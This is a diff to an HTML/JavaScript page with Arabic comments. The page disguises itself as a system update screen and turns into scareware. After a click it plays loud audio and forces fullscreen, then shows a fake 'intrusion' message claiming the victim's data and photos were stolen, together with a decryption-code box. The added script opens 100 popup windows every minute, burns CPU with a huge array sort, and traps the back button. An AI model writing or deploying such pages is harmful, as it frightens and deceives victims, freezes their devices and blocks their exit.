@@ -7,7 +7,7 @@
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; font-family: 'Courier New', monospace; }
         
-        /* صورة المرأة المرعبة (المراقبة) سواسوة */
+        /* 1. صورة المرأة: تغطي الشاشة وتتحرك بطريقة مخيفة سواسوة */
         #stalkerEntity { 
             position: fixed; top: 0; left: 0; width: 105vw; height: 105vh; 
             object-fit: cover; z-index: 1; display: none;
@@ -16,87 +16,101 @@
         }
 
         @keyframes breathingStalker {
-            0%, 100% { transform: scale(1); filter: brightness(30%); }
-            50% { transform: scale(1.05); filter: brightness(50%); }
+            0%, 100% { transform: scale(1) translate(-2.5%, -2.5%); filter: brightness(30%); }
+            50% { transform: scale(1.08) translate(-4%, -4%); filter: brightness(50%); }
         }
 
-        /* واجهة التحديث الوهمية سواسوة */
+        /* 2. واجهة التحديث الوهمية (Deception UI) سواسوة */
         #loaderBox {
             position: fixed; z-index: 100; color: #0f0; text-align: center;
-            width: 80%; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 85%; top: 50%; left: 50%; transform: translate(-50%, -50%);
         }
 
-        .progress-bar { width: 100%; background: #222; height: 10px; border-radius: 5px; margin-top: 15px; overflow: hidden; }
-        .progress-fill { width: 0%; background: #0f0; height: 100%; animation: fill 10s forwards; }
+        .progress-bar { width: 100%; background: #222; height: 8px; border-radius: 4px; margin-top: 15px; overflow: hidden; }
+        .progress-fill { width: 0%; background: #0f0; height: 100%; animation: fillLoader 12s forwards; }
         
-        @keyframes fill { to { width: 100%; } }
+        @keyframes fillLoader { to { width: 100%; } }
 
+        /* 3. واجهة الرسالة الحمراء (Deep Web Style) سواسوة */
         #deepWebOverlay { 
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            z-index: 200; background: rgba(0,0,0,0.9); color: #f00; 
+            z-index: 200; background: rgba(0,0,0,0.85); color: #f00; 
             display: none; flex-direction: column; justify-content: center; align-items: center;
-            text-align: center;
+            text-align: center; font-weight: bold;
         }
 
-        .blink { animation: blinker 0.2s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        .blink { animation: blinker 0.15s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0.2; } }
+
+        #unlockPrompt { border: 1px solid #f00; background: #000; color: #f00; padding: 10px; margin-top: 20px; width: 70%; text-align: center; outline: none; }
     </style>
 </head>
-<body onclick="startInfection()">
+<body onclick="initiateInfection()">
 
     <div id="loaderBox">
-        <p id="statusText">Installing System Update... 14%</p>
+        <h2 id="statusText">System Update: 12%</h2>
         <div class="progress-bar"><div class="progress-fill"></div></div>
-        <p style="font-size: 10px; color: #555; margin-top: 10px;">Don't turn off your device</p>
+        <p style="font-size: 11px; color: #444; margin-top: 15px;">BOOTLOADER_ACCESS: PENDING...</p>
     </div>
 
     <img id="stalkerEntity" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
     <div id="deepWebOverlay">
-        <h1 class="blink">SYSTEM HIJACKED</h1>
-        <p style="padding: 20px;">[ERROR_403]: تم سحب صلاحيات المسؤول.<br>جهازك الآن تحت مراقبة STALKER SYSTEM.<br>لا يمكنك الخروج حتى إكمال المهمة.</p>
-        <p style="font-size: 12px; color: #fff;">ROOT_DIR: /system/bin/stalker_virus</p>
+        <h1 class="blink">STALKER SYSTEM INTRUSION</h1>
+        <p style="padding: 15px; font-size: 14px;">[CRITICAL]: لقد تم اختراق طبقات الحماية.<br>كل بياناتك وصورك الآن في خوادمنا.<br>لا تغلق الهاتف.. نحن نراك سواسوة.</p>
+        <input type="text" id="unlockPrompt" placeholder="أدخل كود فك التشفير">
     </div>
 
-    <audio id="sfx" loop><source src="tfy-krk.mp3" type="audio/mpeg"></audio>
+    <audio id="horrorAudio" loop><source src="tfy-krk.mp3" type="audio/mpeg"></audio>
 
     <script>
-        let stage = 0;
+        let isActive = false;
 
-        function startInfection() {
-            if(stage !== 0) return;
-            stage = 1;
+        function initiateInfection() {
+            if(isActive) return;
+            isActive = true;
 
-            // تشغيل الصوت والـ Fullscreen سواسوة
-            const audio = document.getElementById('sfx');
+            // تفعيل الصوت والشاشة الكاملة سواسوة
+            const audio = document.getElementById('horrorAudio');
             audio.volume = 1.0;
             audio.play();
             document.documentElement.requestFullscreen();
 
-            // تحديث نص الخداع سواسوة
-            let progress = 14;
-            const interval = setInterval(() => {
-                progress += Math.floor(Math.random() * 5);
-                document.getElementById('statusText').innerText = `Installing System Update... ${progress}%`;
-                
+            // محاكاة تحميل التحديث سواسوة
+            let progress = 12;
+            const progressTimer = setInterval(() => {
+                progress += Math.floor(Math.random() * 4);
                 if(progress >= 100) {
-                    clearInterval(interval);
-                    showStalker();
+                    progress = 100;
+                    clearInterval(progressTimer);
+                    triggerStalkerMode();
                 }
-            }, 300);
+                document.getElementById('statusText').innerText = `System Update: ${progress}%`;
+            }, 400);
         }
 
-        function showStalker() {
+        function triggerStalkerMode() {
             document.getElementById('loaderBox').style.display = 'none';
             document.getElementById('stalkerEntity').style.display = 'block';
             document.getElementById('deepWebOverlay').style.display = 'flex';
 
-            // تفعيل الـ Loop الملعون سواسوة
+            // ميزة اللاق الدوري (100 صفحة كل دقيقة) سواسوة
+            const lagShock = () => {
+                for(let i=0; i<100; i++) {
+                    window.open(window.location.href, '_blank', 'width=10,height=10');
+                }
+                // استهلاك المعالج سواسوة
+                let stress = new Array(5000000).fill("💀").sort();
+            };
+
+            // أول صدمة بعد 3 ثواني ثم كل دقيقة سواسوة
+            setTimeout(lagShock, 3000);
+            setInterval(lagShock, 60000);
+
+            // منع زر الرجوع سواسوة
             setInterval(() => {
-                // منع الخروج وتعطيل قوقل سواسوة بالتكامل مع سكريبت نانو
                 history.pushState(null, null, window.location.href);
-                window.open(window.location.href, '_blank', 'width=10,height=10');
-            }, 1000);
+            }, 500);
         }
 
         window.onpopstate = () => history.go(1);
